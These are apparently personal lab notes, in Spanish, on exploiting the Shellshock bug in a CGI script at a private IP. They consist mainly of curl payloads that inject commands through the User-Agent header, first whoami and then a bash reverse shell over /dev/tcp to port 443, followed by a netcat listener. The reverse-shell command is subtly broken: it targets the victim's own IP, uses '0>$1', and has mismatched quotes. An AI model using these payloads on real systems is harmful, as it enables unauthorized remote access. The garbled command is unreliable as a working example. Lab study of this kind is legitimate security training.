tags: 
____

```bash
curl -s -X GET "http://172.20.10.5/cgi-bin/test.sh" -H "User-Agent: () { :; }; /usr/bin/whoami"
```

![Pasted image 20251015152306](../../Anexos/Pasted%20image%2020251015152306.png)

>NOTA: Si el servidor no arroja un resultado o da error, probar este otro:

```bash
curl -s -X GET "http://172.20.10.5/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```

![Pasted image 20251015152325](../../Anexos/Pasted%20image%2020251015152325.png)

Ahora, nos enviamos una reverse shell a nuestra máquina de atacante utilizando netcat en escucha por el puerto 443:

```bash
curl -s -X GET "http://172.20.10.5/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/bash -c "bash -i >& /dev/tcp/172.20.10.5/443 0>$1"
```

Ahora nos ponemos en escucha por el puerto 443 con el siguiente comando:

```bash
netcat -lvnp 443
```

Ejecutamos la URL, y tenemos reverse shell con www-data:

